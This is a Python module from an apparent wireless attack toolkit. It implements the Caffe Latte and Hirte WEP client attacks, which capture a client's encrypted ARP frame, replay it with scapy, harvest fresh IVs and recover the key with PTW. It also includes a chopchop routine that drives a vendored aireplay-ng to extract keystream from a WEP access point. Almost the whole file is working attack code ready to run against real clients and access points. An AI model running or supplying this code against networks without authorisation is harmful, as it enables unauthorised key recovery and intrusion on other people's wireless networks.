"""WEP client-side attacks: Caffe Latte, Hirte, and chopchop.

These target WEP clients directly — no AP association needed.

Caffe Latte / Hirte
-------------------
Capture one WEP-encrypted ARP from the client, re-inject it directed at
the client.  The client decrypts it (WEP has no replay protection), sees
an ARP request, and sends an ARP reply encrypted with a FRESH IV — a new
keystream sample for PTW.  Enough replies → crack the key offline.

Hirte is the same capture/replay loop but starts with the client in
ad-hoc/IBSS mode rather than infrastructure mode; the frame injection
path is identical.

Chopchop
--------
The native from-scratch approach below (decrypt one WEP-encrypted frame
byte-by-byte using the AP as an ICV oracle) is disabled — its ICV-correction
math never worked against real RC4 encryption (see the comment above
chopchop()).  chopchop_vendor() drives this project's own vendored/
self-compiled aircrack-ng's real -4/--chopchop mode instead; that's the one
actually in use.
"""

from __future__ import annotations

import shutil
import subprocess
import tempfile
import threading
import time
from pathlib import Path

from scapy.layers.dot11 import Dot11, Dot11WEP
from scapy.packet import Packet
from scapy.sendrecv import sendp, sniff

from ..cli_commands import CHOPCHOP_BIN
from ..frames import with_forced_rate
from ..radio import ensure_channel
from ..storage import organized_output_path
from ..wep.crypto import recover_keystream
from ..wep.ptw import PTWVoteTable, compute_key
from .wep import (
    ARP_KNOWN_PREFIX,
    ARP_LEN_WIRED,
    ARP_LEN_WIRELESS,
    is_wep_arp_candidate,
    wep_iv_and_ciphertext,
)

# Minimum sessions needed before PTW is attempted for client attacks
_MIN_SESSIONS_CAFFE = 5_000


# ── Caffe Latte ───────────────────────────────────────────────────────────────

def caffe_latte(
    iface: str,
    client_mac: str,
    key_len: int = 5,
    channel: int | None = None,
    timeout: float = 120.0,
    target_sessions: int = _MIN_SESSIONS_CAFFE,
    low_rate: bool = False,
    stop_event: threading.Event | None = None,
    sniff_fn=sniff,
    sendp_fn=sendp,
    progress_fn=None,
) -> bytes | None:
    """Caffe Latte: crack WEP by replaying client ARPs back at the client.

    low_rate: force a 2 Mbps injection rate on the replayed seed frame
    instead of its own captured RadioTap -- see frames.with_forced_rate.

    No AP needed.  client_mac must be in range and actively sending ARP.
    We capture one ARP, replay it directed at client_mac; each ARP reply
    from the client is a fresh IV sample.  Returns root key or None.

    Steps:
    1. Monitor for WEP ARP from client_mac.
    2. Re-inject that same frame directed at client_mac repeatedly.
    3. Capture ARP replies from client_mac (fresh IVs) → PTW table.
    4. When target_sessions reached, run compute_key and return.
    """
    stop = stop_event or threading.Event()
    ensure_channel(iface, channel)

    table = PTWVoteTable(num_positions=key_len)
    seed_frame: Packet | None = None
    deadline = time.monotonic() + timeout

    client_mac_lower = client_mac.lower()

    def _is_from_client(pkt: Packet) -> bool:
        d = pkt.getlayer(Dot11)
        return d is not None and (d.addr2 or "").lower() == client_mac_lower

    def _is_reply_from_client(pkt: Packet) -> bool:
        """WEP ARP-sized reply FROM client (addr2 = client, not broadcast dst)."""
        if not pkt.haslayer(Dot11WEP):
            return False
        d = pkt.getlayer(Dot11)
        if d is None or (d.addr2 or "").lower() != client_mac_lower:
            return False
        # ARP reply is typically unicast; length check
        frame_len = len(bytes(d))
        return frame_len in (ARP_LEN_WIRELESS, ARP_LEN_WIRED)

    # Phase 1: capture one ARP from client
    captured: list[Packet] = []

    def _on_capture(pkt: Packet) -> None:
        if not captured and _is_from_client(pkt) and is_wep_arp_candidate(pkt):
            captured.append(pkt)

    while not stop.is_set() and not captured and time.monotonic() < deadline:
        sniff_fn(iface=iface, timeout=2.0, prn=_on_capture, store=False,
                 stop_filter=lambda _: bool(captured))

    if not captured:
        return None
    seed_frame = with_forced_rate(captured[0], mbps=2) if low_rate else captured[0]

    # Phase 2: replay + collect fresh IVs from client replies
    def _on_reply(pkt: Packet) -> None:
        if not _is_reply_from_client(pkt):
            return
        extracted = wep_iv_and_ciphertext(pkt)
        if extracted is None:
            return
        iv, ct = extracted
        if len(ct) < len(ARP_KNOWN_PREFIX):
            return
        ks = recover_keystream(ct, ARP_KNOWN_PREFIX)
        table.add_session(iv, ks)

    REPLAY_BATCH = 200
    REPLAY_INTER = 0.005

    if progress_fn is not None:
        progress_fn(f"Caffe Latte: captured seed ARP from {client_mac}, starting replay")

    while not stop.is_set() and len(table.sessions) < target_sessions and time.monotonic() < deadline:
        sendp_fn(seed_frame, iface=iface, count=REPLAY_BATCH, inter=REPLAY_INTER, verbose=False)
        sniff_fn(iface=iface, timeout=1.0, prn=_on_reply, store=False)
        if progress_fn is not None:
            pct = 100 * len(table.sessions) // target_sessions
            progress_fn(f"Caffe Latte IVs: {len(table.sessions)}/{target_sessions} ({pct}%)")

    if not table.sessions:
        return None
    return compute_key(table, key_len=key_len, top_k=16, max_candidates=200_000)


# ── Hirte (IBSS / ad-hoc variant) ────────────────────────────────────────────

def hirte(
    iface: str,
    client_mac: str,
    key_len: int = 5,
    channel: int | None = None,
    timeout: float = 120.0,
    target_sessions: int = _MIN_SESSIONS_CAFFE,
    low_rate: bool = False,
    stop_event: threading.Event | None = None,
    sniff_fn=sniff,
    sendp_fn=sendp,
) -> bytes | None:
    """Hirte attack: same as Caffe Latte, targeting ad-hoc/IBSS WEP clients.

    In ad-hoc mode the DS bits differ (IBSS frames use addr3 for BSSID)
    but the IV-capture loop is identical.  The only practical difference
    is that the injected frame's DS flags match IBSS frame type (toDS=0,
    fromDS=0) rather than infrastructure (toDS=1, fromDS=0).
    For our monitor-mode replay the same seed_frame retransmit works.
    """
    return caffe_latte(
        iface=iface,
        client_mac=client_mac,
        key_len=key_len,
        channel=channel,
        timeout=timeout,
        target_sessions=target_sessions,
        low_rate=low_rate,
        stop_event=stop_event,
        sniff_fn=sniff_fn,
        sendp_fn=sendp_fn,
    )


# ── Chopchop ──────────────────────────────────────────────────────────────────
#
# The native from-scratch attempt below was disabled after two independent
# offline verification passes (2026-08-25): the ICV-correction math doesn't
# survive contact with WEP's actual RC4-encrypted trailer (500/500 failures
# reconstructing a real re-encrypted shortened frame via this project's own
# validated wep_encrypt()) — CRC-32 "un-append" is only a valid inverse over
# a true cleartext CRC register, and that identity does not commute through
# an independent keystream XOR at each byte position. Reimplementing this
# correctly needs the same KoreK (2004) derivation routed through RC4, not
# just a bare CRC reversal.
#
# The real fix: this project already vendors and compiles a working
# chopchop implementation (vendor/aircrack-ng, wired to `-4`/`--chopchop`)
# — the same self-built binary this project already uses elsewhere in
# cli.py, not a third-party tool being wrapped as a fallback. See
# chopchop_vendor() below — it drives that binary instead of this function.


def chopchop(
    iface: str,
    bssid: str,
    pkt: Packet,
    key_len: int = 5,
    channel: int | None = None,
    timeout: float = 300.0,
    stop_event: threading.Event | None = None,
    sniff_fn=sniff,
    sendp_fn=sendp,
) -> bytes | None:
    """Disabled — see the module-level note above this function.

    The native ICV-correction math never worked correctly (confirmed via
    two independent offline tests, not just a live failure), so this raises
    instead of running a guess loop that could never succeed against a real
    AP. Use chopchop_vendor() below instead — it drives this project's own
    vendored/self-compiled aircrack-ng binary's real chopchop attack.
    """
    raise NotImplementedError(
        "chopchop is disabled: its WEP ICV-correction math doesn't work "
        "through RC4 encryption (verified offline, not just untested) — see "
        "the comment above this function. Use chopchop_vendor() instead — "
        "it drives this project's own vendored aircrack-ng chopchop attack."
    )


def chopchop_vendor(
    iface: str,
    bssid: str,
    own_mac: str,
    channel: int | None = None,
    timeout: float = 300.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> Path | None:
    """Recover WEP plaintext/keystream via the vendored aireplay-ng's real
    -4/--chopchop mode — this is the working replacement for chopchop()
    above (see that function's docstring for why the native attempt is
    disabled).

    `-F` picks the first matching WEP data packet automatically instead of
    prompting "Use this packet ? y/n" — that interactive prompt was the
    reason wiring the vendored binary in was previously left as future
    work. With it gone the whole run is a single bounded, non-interactive
    subprocess: no live stdin handling needed.

    chopchop reveals plaintext/keystream, not the WEP key itself (that's
    inherent to the attack, not a limitation of this wiring) — returns the
    path to the recovered `.xor` PRGA file on success, or None if
    aireplay-ng never got a candidate packet accepted before timeout/stop.
    Requires a genuine WEP AP with WEP data traffic; against WPA/WPA2 or a
    silent target this will just run out the clock.
    """
    ensure_channel(iface, channel)
    outdir = Path(tempfile.mkdtemp(prefix="atwa-chopchop-"))
    cmd = [str(CHOPCHOP_BIN), "-4", "-F", "-b", bssid, "-h", own_mac, iface]

    proc = subprocess.Popen(
        cmd, cwd=outdir, stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    deadline = time.monotonic() + timeout
    try:
        while proc.poll() is None:
            if time.monotonic() > deadline or (stop_event is not None and stop_event.is_set()):
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                break
            time.sleep(1.0)
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait()

    output = proc.stdout.read() if proc.stdout else ""
    if progress_fn is not None and output.strip():
        progress_fn(f"chopchop: aireplay-ng output tail:\n{output.strip()[-500:]}")

    xor_files = sorted(outdir.glob("replay_dec-*.xor"))
    if not xor_files:
        if progress_fn is not None:
            progress_fn("chopchop: no packet decrypted (AP rejected every candidate, or none seen before timeout)")
        return None

    dest = organized_output_path("chopchop", f"{bssid.replace(':', '-')}.xor")
    shutil.copyfile(xor_files[-1], dest)
    if progress_fn is not None:
        progress_fn(f"chopchop: recovered keystream saved to {dest}")
    return dest
